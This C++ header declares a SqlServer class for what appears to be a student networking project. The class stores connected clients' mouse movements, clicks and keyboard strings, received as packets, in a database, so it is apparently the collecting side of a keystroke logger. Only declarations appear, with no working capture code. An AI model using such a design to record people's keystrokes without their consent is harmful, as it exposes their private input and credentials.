//
// SqlServer.hh for sqlServer in /home/debrab_t/rendu/TEK3/cpp_spider/bdd_connect
//
// Made by debrab_t
// Login   <debrab_t@epitech.net>
//
// Started on  Mon Nov  7 10:23:23 2016 debrab_t
// Last update Wed Nov  9 14:33:05 2016 debrab_t
//

#ifndef SQLSERVER_HH_
# define SQLSERVER_HH_

#include "socket/serverTcpSocket.hpp"

namespace spider
{
  namespace socket
  {
    class user;
  }
}

class SqlServer
{
public:
  SqlServer();
  ~SqlServer();
  bool	dbConnect(std::string const &);
  void	createServTab();
  void	addClient(spider::PacketUnserializer &);
  void	addMouseMouvement(spider::PacketUnserializer &);
  void	addMouseClick(spider::PacketUnserializer &);
  void	addKeyboardString(spider::PacketUnserializer &);
  void	disconnectClient(spider::PacketUnserializer &);
  bool	putIntoBdd(spider::PacketUnserializer &,
		   std::shared_ptr<spider::socket::user> );
  void	feedPointMap();

private:
  SqlManager	sqlMan;
  int		clientId;
  typedef void	(SqlServer::*bddFunc)(spider::PacketUnserializer &);
  std::map<std::string, bddFunc> _pointMap;
};

#endif /* SQLSERVER_HH_ */
